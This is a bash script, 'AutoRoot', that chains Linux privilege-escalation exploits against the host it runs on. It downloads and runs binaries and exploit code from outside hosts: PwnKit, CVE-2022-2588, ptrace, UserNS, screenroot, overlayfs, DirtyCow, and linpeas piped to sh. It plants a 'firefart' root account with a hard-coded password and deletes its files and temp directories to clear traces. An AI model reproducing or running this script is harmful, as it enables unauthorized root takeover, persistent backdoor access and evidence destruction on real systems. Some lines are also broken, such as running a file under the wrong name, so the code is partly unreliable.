#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

uname=$(uname -a)
version=$(uname -r)
hostname=$(uname -n)

echo -e "$cyan[*]$yellow hostname :$okegreen $hostname"
echo -e "$cyan[*]$yellow version :$okegreen $version"
echo -e "$cyan[*]$yellow all :$okegreen $uname"
echo -e "$cyan[*]$white AutoRoot By LeviathanPerfectHunter"
echo -e "$cyan[*]$yellow Linux Suggester For Searching Exploit"
wget -q --no-check-certificate https://leviathan1337.github.io/ls.pl;chmod +x ./ls.pl
./linux-suggester.pl
rm -rf linux-suggester.pl
sleep 1
echo -e "$cyan[*]$yellow Trying Mass Exploits....."
echo -e "$cyan[*]$yellow Trying exploits PwnKit....."
wget -q --no-check-certificate https://leviathan1337.github.io/pwnkit;chmod +x ./pwnkit
if [[ $(./pwnkit 'id') =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen $(./pwnkit 'id')"
./pwnkit
else
sleep 1
echo -e "$cyan[*]$red Failed exploits PwnKit"
rm -rf pwnkit
sleep 1
echo -e "$cyan[*]$yellow Trying exploits CVE-2022-2588....."
wget -q --no-check-certificate https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential;chmod 0755 exp_file_credential
./exp_file_credential
rm -rf exp_file_credential
if [[ $(cat /etc/passwd | grep ":0:0:/root/") =~ ":0:0:/root/" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
else
echo -e "$cyan[*]$red Failed exploits CVE-2022-2588"
sleep 1
echo -e "$cyan[*]$red Failed exploits CVE-2022-2588"
rm -rf CVE-2022-2588
sleep 1
echo -e "$cyan[*]$yellow Trying exploits ptrace....."
wget -q https://raw.githubusercontent.com/jas502n/CVE-2019-13272/master/CVE-2019-13272.c -O poc.c
gcc -s poc.c -o ptrace_traceme_root
./ptrace_traceme_root
if [[ $(id) =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
else
rm -rf ptrace_traceme_root
echo -e "$cyan[*]$red Failed exploits ptrace"
sleep 1
echo -e "$cyan[*]$yellow Trying exploits LPE....."
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -f "$file" ]];
then
echo -e "$cyan[*]$yellow Vulnerable SUID binary found!"
echo -e "$cyan[*]$yellow Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
else
echo -e "$cyan[*]$red Failed exploits LPE"
sleep 1
rm -rf /tmp/*
rm -rf /dev/shm/*
echo -e "$cyan[*]$yellow Trying exploits UserNS....."
wget -q --no-check-certificate https://leviathan1337.github.io/user
chmod 0755 user
if [[ $(./user -p -m -U -M '0 1000 1' -G '0 1000 1' id) =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen r00ted: $(./user -p -m -U -M '0 1000 1' -G '0 1000 1' id)"
./user -p -m -U -M '0 1000 1' -G '0 1000 1' /bin/sh
else
echo -e "$cyan[*]$red Failed exploits UserNS"
rm -rf user
sleep 1
echo -e "$cyan[*]$yellow Trying exploits screenroot....."
wget -q --no-check-certificate https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh;chmod 0755 screenroot.sh
./screenroot.sh
if [[ $(/tmp/rootshell shell id) =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen r00ted: $(/tmp/rootshell shell id)"
else
echo -e "$cyan[*]$red Failed exploits screenroot"
rm -rf screenroot.sh
echo -e "$cyan[*]$yellow Trying exploit overlayfs..."
wget -q --no-check-certificate https://leviathan1337.github.io/overlayfs
./overlayfs
echo -e "$cyan[*]$red Failed exploit overlayfs..."
rm -rf overlayfs
sleep 1
echo -e "$cyan[*]$yellow Analysis Using Linpeas....."
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh -a
echo -e "$cyan[*]$yellow Trying exploit DirtyCow....."
wget -q --no-check-certificate https://www.exploit-db.com/raw/40839 -O dirty.c
echo -e "$cyan[*]$yellow Trying Compiling DirtyCow....."
gcc -pthread dirty.c -o dirty -lcrypt
echo -e "$cyan[*]$yellow Setting Up default password :$okegreen @haxorworld.....$reset"
./dirty @haxorworld
if [[ $(cat /etc/passwd | grep firefart) =~ "firefart" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen Login: firefart| password: @haxorworld"
rm -rf *
exit
fi
fi
fi
fi
fi
fi
fi
